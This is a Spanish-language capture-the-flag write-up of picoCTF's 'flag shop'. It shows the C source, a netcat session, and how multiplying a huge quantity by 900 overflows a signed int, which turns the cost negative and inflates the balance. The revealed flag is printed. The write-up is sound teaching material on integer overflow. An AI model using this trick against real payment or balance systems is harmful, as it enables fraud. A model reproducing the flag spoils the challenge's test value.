## Descripcion
There's a flag shop selling stuff, can you buy a flag? [Source](https://challenge-files.picoctf.net/c_fickle_tempest/a688b629e6044019fb08e6323c70c4604d60853d771e5ae1137f90b0f1039056/store.c). Connect with nc fickle-tempest.picoctf.net 56280.
## Solucion
```
┌──(min㉿WIN-U49VUBQG3G3)-[~]
└─$ cat store.c
#include <stdio.h>
#include <stdlib.h>
int main()
{
    setbuf(stdout, NULL);
    int con;
    con = 0;
    int account_balance = 1100;
    while(con == 0){

        printf("Welcome to the flag exchange\n");
        printf("We sell flags\n");

        printf("\n1. Check Account Balance\n");
        printf("\n2. Buy Flags\n");
        printf("\n3. Exit\n");
        int menu;
        printf("\n Enter a menu selection\n");
        fflush(stdin);
        scanf("%d", &menu);
        if(menu == 1){
            printf("\n\n\n Balance: %d \n\n\n", account_balance);
        }
        else if(menu == 2){
            printf("Currently for sale\n");
            printf("1. Defintely not the flag Flag\n");
            printf("2. 1337 Flag\n");
            int auction_choice;
            fflush(stdin);
            scanf("%d", &auction_choice);
            if(auction_choice == 1){
                printf("These knockoff Flags cost 900 each, enter desired quantity\n");

                int number_flags = 0;
                fflush(stdin);
                scanf("%d", &number_flags);
                if(number_flags > 0){
                    int total_cost = 0;
                    total_cost = 900*number_flags;
                    printf("\nThe final cost is: %d\n", total_cost);
                    if(total_cost <= account_balance){
                        account_balance = account_balance - total_cost;
                        printf("\nYour current balance after transaction: %d\n\n", account_balance);
                    }
                    else{
                        printf("Not enough funds to complete purchase\n");
                    }


                }




            }
            else if(auction_choice == 2){
                printf("1337 flags cost 100000 dollars, and we only have 1 in stock\n");
                printf("Enter 1 to buy one");
                int bid = 0;
                fflush(stdin);
                scanf("%d", &bid);

                if(bid == 1){

                    if(account_balance > 100000){
                        FILE *f = fopen("flag.txt", "r");
                        if(f == NULL){

                            printf("flag not found: please run this on the server\n");
                            exit(0);
                        }
                        char buf[64];
                        fgets(buf, 63, f);
                        printf("YOUR FLAG IS: %s\n", buf);
                        }

                    else{
                        printf("\nNot enough funds for transaction\n\n\n");
                    }}

            }
        }
        else{
            con = 1;
        }

    }
    return 0;
}

┌──(min㉿WIN-U49VUBQG3G3)-[~]
└─$ nc fickle-tempest.picoctf.net 56280
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
2500000

The final cost is: -2044967296

Your current balance after transaction: 2044968396

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1
YOUR FLAG IS: picoCTF{m0n3y_bag5_F6968F69}

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
```

## Notas
revisando el programa que nos da el reto vemos que donde dice total_cost = 900*number_flags; tiene una vulnerabilidad ya que si en number_flags tenemos un valor lo suficientemente grande para que la multiplicacion supere el limite el numero se vuelve negativo, a esto se le conoce como integer overflow, entonces ya estando en el servidor le damos a la opcion de buy flags, despues  en la opcion 1, y ahi ponemos un valor grande como 2,500,000 ya que si dividimos 2,147,483,647 que es el valor maximo de un int, entre 900 nos da 2,368,092, cualquier valor mayor a esto hara que el costo se vuelva negativo, ahora dice que nuestro balance es de mas de 2 mil millones, con esto ya podemos comprar la opcion que dice 1337 flag y con esto obtener la bandera: picoCTF{m0n3y_bag5_F6968F69}
## Referencias
- 